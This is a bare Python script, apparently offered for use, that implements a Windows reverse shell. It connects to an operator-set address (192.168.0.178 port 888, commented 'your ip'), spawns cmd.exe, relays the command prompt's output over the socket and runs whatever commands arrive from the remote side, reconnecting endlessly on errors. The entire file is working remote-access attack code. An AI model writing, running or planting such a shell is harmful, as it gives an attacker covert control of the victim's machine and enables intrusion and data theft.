import asyncio
import socket

HOST = "192.168.0.178" # your ip
PORT = 888 # your port

async def shell():
    while 1:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            
            while 1:
                proc = await asyncio.create_subprocess_shell("cmd",
                                                             stdin=asyncio.subprocess.PIPE,
                                                             stdout=asyncio.subprocess.PIPE,
                                                             stderr=asyncio.subprocess.STDOUT)
                cmd = b"\n"
                proc.stdin.write(cmd)

                while 1:
                    while 1:
                        out = await proc.stdout.readline()
                        break_ = out.decode("latin-1")
                        if break_[-2:] == ">\n" or break_[-3:] == "> \n":
                            s.send(out[:-1])
                            break
                        elif break_.endswith(">" + cmd.decode()) or break_.endswith("> " + cmd.decode()):
                            pass
                        else:
                            s.send(out)

                    cmd = s.recv(1024)
                    cmd_ = cmd.decode()
                    if cmd_ == "\n":
                        proc.stdin.write(b"\n")
                    elif cmd_.startswith("exit"):
                        proc.terminate()
                        break
                    else:
                        proc.stdin.write(cmd + b"\n")
        except Exception as e:
            print(e)
asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
asyncio.run(shell())
